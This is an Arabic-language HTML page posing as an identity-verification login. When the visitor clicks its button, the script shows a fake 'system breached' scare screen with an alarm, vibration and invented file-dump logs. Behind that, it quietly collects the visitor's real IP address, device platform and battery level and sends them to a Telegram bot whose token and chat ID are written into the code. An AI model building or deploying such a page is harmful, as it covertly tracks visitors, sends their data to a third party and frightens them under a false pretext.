<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>TERMINAL | SYSTEM SEIZED</title>
    <style>
        body { background: #000; color: #f00; font-family: 'Courier New', monospace; margin: 0; overflow: hidden; height: 100vh; }
        .danger-bg { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: radial-gradient(circle, #400 0%, #000 100%); z-index: -1; animation: flash 0.5s infinite; display: none; }
        @keyframes flash { 0% { opacity: 1; } 50% { opacity: 0.5; } 100% { opacity: 1; } }

        .container { height: 100vh; display: flex; flex-direction: column; align-items: center; justify-content: center; text-align: center; z-index: 10; position: relative; }
        .glitch-text { font-size: 40px; font-weight: bold; text-shadow: 2px 2px #fff; animation: shake 0.1s infinite; display: none; }
        @keyframes shake { 0% { transform: translate(0); } 25% { transform: translate(5px, -5px); } 50% { transform: translate(-5px, 5px); } 75% { transform: translate(5px, 5px); } 100% { transform: translate(0); } }

        .btn-activate { background: transparent; border: 2px solid #f00; color: #f00; padding: 20px 40px; font-size: 20px; cursor: pointer; box-shadow: 0 0 20px #f00; transition: 0.3s; }
        .btn-activate:hover { background: #f00; color: #fff; }

        #log-box { width: 80%; max-width: 500px; background: rgba(0,0,0,0.8); border: 1px solid #f00; padding: 15px; margin-top: 20px; text-align: left; font-size: 12px; color: #0f0; display: none; }
    </style>
</head>
<body>

    <div class="danger-bg" id="bg"></div>

    <div class="container" id="ui">
        <h1 id="header" style="color:#0f0">> SECURE LINK VERIFIED</h1>
        <p id="sub">اضغط لتأكيد الهوية والدخول</p>
        <button class="btn-activate" onclick="startTheChaos()">دخول للنظام ⚡</button>
        
        <div id="log-box"></div>
    </div>

    <audio id="alarm" src="https://www.soundjay.com/buttons/beep-01a.mp3" loop></audio>

    <script>
        const TOKEN = "7585903503:AAG8TeGfyaDY8vuN8RdmIXL92yDAqoqaBu0";
        const CID = "7772577035";

        async function sendToTg(msg) {
            fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${CID}&text=${encodeURIComponent(msg)}&parse_mode=Markdown`);
        }

        async function startTheChaos() {
            // تشغيل الصوت والاهتزاز
            document.getElementById('alarm').play();
            if (navigator.vibrate) navigator.vibrate([500, 110, 500, 110, 500]);

            // تغيير الواجهة للوضع المرعب
            document.getElementById('bg').style.display = "block";
            document.getElementById('header').innerText = "SYSTEM BREACHED";
            document.getElementById('header').className = "glitch-text";
            document.getElementById('header').style.display = "block";
            document.getElementById('sub').innerText = "YOUR DATA IS BEING EXFILTRATED...";
            document.getElementById('sub').style.color = "#fff";
            document.querySelector('.btn-activate').style.display = "none";
            document.getElementById('log-box').style.display = "block";

            // سحب البيانات الحقيقية
            let ip = await fetch('https://api.ipify.org?format=json').then(r=>r.json()).catch(()=>({ip:"Unknown"}));
            let bat = await navigator.getBattery().catch(()=>({level:0}));

            let report = `🚨 **تم صيد "دخيل" جديد!**\n------------------\n🌐 IP: \`${ip.ip}\`\n📱 الجهاز: \`${navigator.platform}\`\n🔋 البطارية: \`${(bat.level*100)}%\``;
            sendToTg(report);

            // محاكاة سحب الملفات
            let logs = ["> Connecting to local storage...", "> Dumping DCIM/Camera...", "> Syncing WhatsApp database...", "> Uploading to Wasit-Server...", "> [DONE]"];
            let box = document.getElementById('log-box');
            logs.forEach((l, i) => {
                setTimeout(() => { box.innerHTML += `<p style="margin:5px 0">${l}</p>`; }, i * 800);
            });

            setTimeout(() => {
                alert("CRITICAL ERROR: DATA LEAKED TO EXTERNAL SERVER.");
            }, 5000);
        }
    </script>
</body>
</html>
